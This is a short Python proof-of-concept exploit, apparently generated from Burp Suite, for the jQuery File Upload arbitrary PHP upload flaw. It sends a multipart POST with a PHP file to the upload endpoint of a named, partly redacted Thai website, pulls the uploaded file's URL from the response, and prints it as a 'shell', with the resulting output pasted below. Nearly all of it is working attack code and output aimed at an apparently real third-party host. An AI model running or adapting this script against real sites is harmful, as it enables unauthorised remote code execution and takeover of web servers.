import requests
import json

burp0_url = "http://purchasing-oneplus-new.xxx.in.th:80/assets/plugins/jquery-file-upload//server/php/index.php"

burp0_cookies = {"PHPSESSID": "0i5ht16te77l0rvv1o6p1vd49u"}

burp0_headers = {"Content-Type": "multipart/form-data; boundary=a211583f728c46a09ca726497e0a5a9f", "Accept": "*/*", "Accept-Encoding": "gzip,deflate", "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21", "Connection": "Keep-alive"}
burp0_data = "--a211583f728c46a09ca726497e0a5a9f\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"jqueryfileupload_poc.php\"\r\n\r\n<?php phpinfo();?>\r\n--a211583f728c46a09ca726497e0a5a9f--"
rsp = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

shell_addr = json.loads(rsp.content)['files'][0]['url']



print "shell is ==> " + shell_addr


shell is ==> http://purchasing-oneplus-xxxx.xxxx.in.th/assets/plugins/jquery-file-upload//server/php/files/jqueryfileupload_poc%20%284%29.php
